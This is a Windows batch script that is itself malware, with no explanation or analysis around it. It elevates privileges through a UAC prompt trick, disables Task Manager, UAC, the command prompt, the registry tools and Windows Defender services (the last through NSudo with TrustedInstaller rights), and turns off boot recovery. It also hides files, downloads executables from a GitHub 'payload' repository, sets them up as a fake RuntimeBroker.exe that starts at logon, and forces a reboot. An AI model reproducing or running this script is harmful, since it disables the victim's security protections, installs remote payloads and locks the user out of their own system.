powershell -window hidden -command ""
::--------------------------------------
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)
::--------------------------------------
if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( goto gotAdmin )
::--------------------------------------
:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs
::--------------------------------------
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B
::--------------------------------------
:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
::--------------------------------------
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d "1" /f >nul
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d "0" /f
::--------------------------------------
cd "C:\Users\%USERNAME%\AppData\Local"
mkdir "Anon"
attrib +h "Anon" /s /d
::--------------------------------------
Powershell -Command "Invoke-WebRequest 'https://github.com/anonymous-osif/payload/raw/main/fun.jpg' -OutFile C:\Users\%USERNAME%\AppData\Local\Anon\fun.jpg"
start C:\Users\%USERNAME%\AppData\Local\Anon\fun.jpg"
attrib +h "C:\Users\%USERNAME%\AppData\Local\Anon\fun.jpg" /s /d
::--------------------------------------
Powershell -Command "Invoke-WebRequest 'https://github.com/anonymous-osif/payload/raw/main/ss.jpg' -OutFile %TEMP%\ss.jpg"
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "Wallpaper" /t REG_SZ /d "%TEMP%\ss.jpg" /f && RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
attrib +h "%TEMP%\ss.jpg" /s /d
::--------------------------------------
icacls "%pop%\System32\smartscreen.exe" /inheritance:r /remove *S-1-5-32-544 *S-1-5-11 *S-1-5-32-545 *S-1-5-18
::--------------------------------------
set pop=%systemroot%
Powershell -Command "Invoke-WebRequest 'https://github.com/anonymous-osif/payload/raw/main/NSudoLG.exe' -OutFile %TEMP%\NSudoLG.exe"
%TEMP%\NSudoLG -U:T -P:E -ShowWindowMode:Hide reg add "HKLM\SYSTEM\ControlSet001\Services\MsSecFlt" /v "Start" /t REG_DWORD /d "4" /f >nul
%TEMP%\NSudoLG -U:T -P:E -ShowWindowMode:Hide reg add "HKLM\SYSTEM\ControlSet001\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f >nul
%TEMP%\NSudoLG -U:T -P:E -ShowWindowMode:Hide reg add "HKLM\SYSTEM\ControlSet001\Services\Sense" /v "Start" /t REG_DWORD /d "4" /f >nul
%TEMP%\NSudoLG -U:T -P:E -ShowWindowMode:Hide reg add "HKLM\SYSTEM\ControlSet001\Services\WdBoot" /v "Start" /t REG_DWORD /d "4" /f >nul
%TEMP%\NSudoLG -U:T -P:E -ShowWindowMode:Hide reg add "HKLM\SYSTEM\ControlSet001\Services\WdFilter" /v "Start" /t REG_DWORD /d "4" /f >nul
%TEMP%\NSudoLG -U:T -P:E -ShowWindowMode:Hide reg add "HKLM\SYSTEM\ControlSet001\Services\WdNisDrv" /v "Start" /t REG_DWORD /d "4" /f >nul
%TEMP%\NSudoLG -U:T -P:E -ShowWindowMode:Hide reg add "HKLM\SYSTEM\ControlSet001\Services\WdNisSvc" /v "Start" /t REG_DWORD /d "4" /f >nul
%TEMP%\NSudoLG -U:T -P:E -ShowWindowMode:Hide reg add "HKLM\SYSTEM\ControlSet001\Services\WinDefend" /v "Start" /t REG_DWORD /d "4" /f >nul
%TEMP%\NSudoLG -U:T -P:E -ShowWindowMode:Hide reg add "HKLM\SYSTEM\ControlSet001\Services\SgrmAgent" /v "Start" /t REG_DWORD /d "4" /f >nul
%TEMP%\NSudoLG -U:T -P:E -ShowWindowMode:Hide reg add "HKLM\SYSTEM\ControlSet001\Services\SgrmBroker" /v "Start" /t REG_DWORD /d "4" /f >nul
%TEMP%\NSudoLG -U:T -P:E -ShowWindowMode:Hide bcdedit /set {default} recoveryenabled No
%TEMP%\NSudoLG -U:T -P:E -ShowWindowMode:Hide bcdedit /set {default} bootstatuspolicy ignoreallfailures
::--------------------------------------
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /t REG_DWORD /d "1" /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableCMD" /t REG_DWORD /d "1" /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRun" /t REG_DWORD /d "1" /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "Hidden" /t REG_DWORD /f /d "0" >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ShowSuperHidden" /t REG_DWORD /d "0" /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "HideFileExt" /t REG_DWORD /d "1" /f >nul
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "0" /f >nul
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "RuntimeBroker" /t REG_SZ /d "%TEMP%\RuntimeBroker.exe" /f >nul
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "RuntimeBroker" /t REG_SZ /d "%USERPROFILE%\AppData\Roaming\Microsoft\RuntimeBroker.exe" /f >nul
reg add "HKCU\Software\Policies\Microsoft\MMC\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" /v "Restrict_Run" /t REG_DWORD /d "1" /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d "1" /f >nul
::--------------------------------------
Powershell -Command "Invoke-WebRequest 'https://github.com/anonymous-osif/payload/raw/main/RuntimeBroker.exe' -OutFile %USERPROFILE%\AppData\Roaming\Microsoft\RuntimeBroker.exe"
Powershell -Command "Invoke-WebRequest 'https://github.com/anonymous-osif/payload/raw/main/ss/RuntimeBroker.exe' -OutFile %TEMP%\RuntimeBroker.exe"
::--------------------------------------
attrib +h "%USERPROFILE%\AppData\Roaming\Microsoft\RuntimeBroker.exe" /s /d
attrib +h "%TEMP%\RuntimeBroker.exe" /s /d
rmdir /s /q "C:\Users\%USERNAME%\AppData\Local\Anon\"
del "%TEMP%\NSudoLG.exe"
shutdown /r /t 0